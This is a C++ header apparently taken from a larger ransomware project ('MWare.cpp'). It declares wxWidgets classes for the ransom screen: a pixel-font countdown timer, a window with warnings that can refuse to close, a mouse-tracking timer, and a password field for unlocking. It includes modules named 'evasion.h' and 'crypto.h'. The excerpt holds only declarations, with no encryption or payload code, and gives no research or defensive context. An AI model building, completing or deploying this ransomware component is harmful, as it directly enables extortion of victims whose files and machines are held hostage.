// ============================================================================
// gui.h — Ransomware GUI Classes (wxWidgets)
// ============================================================================
// Extracted from MWare.cpp lines 4084-4467.
// Provides:
//   - PixelDigit: 7x5 pixel font matrices for digits 0-9 + colon
//   - PixelTimerPanel: wxPanel displaying countdown timer in pixel font
//   - RansomwareFrame: Main wxFrame with timer, warnings, password input
//   - RansomwareApp: wxApp entry point for the ransomware GUI
//   - CreateWarningIcon: Warning icon image helper
// ============================================================================
#pragma once

#include <string>

#include "api_table.h"
#include "evasion.h"
#include "crypto.h"

// Pixel font digit matrices (7x5) — digits 0-9 + colon at index 10
class PixelDigit {
public:
    static const int digits[11][7][5];
};

class PixelTimerPanel;

// ============================================================================
// wxWidgets includes are inside #ifndef GUI_IMPL guard to avoid duplication
// gui.cpp includes gui.h and then provides the actual implementation
// ============================================================================
#ifndef HEADLESS

#include <wx/wx.h>
#include <wx/timer.h>
#include <wx/dcbuffer.h>
#include <wx/statbmp.h>
#include <wx/file.h>
#include <wx/filename.h>
#include <wx/stdpaths.h>
#include <wx/image.h>
#include <wx/msgdlg.h>

// Warning icon helper — loads Warning-Icon.png from CWD or exe path
wxStaticBitmap* CreateWarningIcon(wxWindow* parent, int size = 24);

// Pixel-style countdown timer panel (7x5 pixel font digits)
class PixelTimerPanel : public wxPanel {
private:
    int hours, minutes, seconds;
    wxColour pixelColor;
    int pixelSize;

public:
    PixelTimerPanel(wxWindow* parent, int h, int m, int s);

    void SetTime(int h, int m, int s);
    void SetPixelColor(wxColour c);
    void OnPaint(wxPaintEvent& event);
    void DrawDigit(wxDC& dc, int x, int y, int d);

    wxDECLARE_EVENT_TABLE();
};

// Main ransomware screen — countdown, warnings, unlock input
class RansomwareFrame : public wxFrame {
private:
    wxTimer* timer;
    wxTimer* mouseTrackerTimer;
    int hours, minutes, seconds;
    PixelTimerPanel* pixelTimerPanel;
    wxTextCtrl* passwordInput;
    bool canClose;

    void OnMouseTracker(wxTimerEvent& event);

public:
    RansomwareFrame();
    void OnClose(wxCloseEvent& event);
    void OnTimer(wxTimerEvent& event);
    void OnUnlock(wxCommandEvent& event);
    ~RansomwareFrame();
};

// wxApp entry point for the ransomware GUI
class RansomwareApp : public wxApp {
public:
    virtual bool OnInit();
};

#endif // HEADLESS
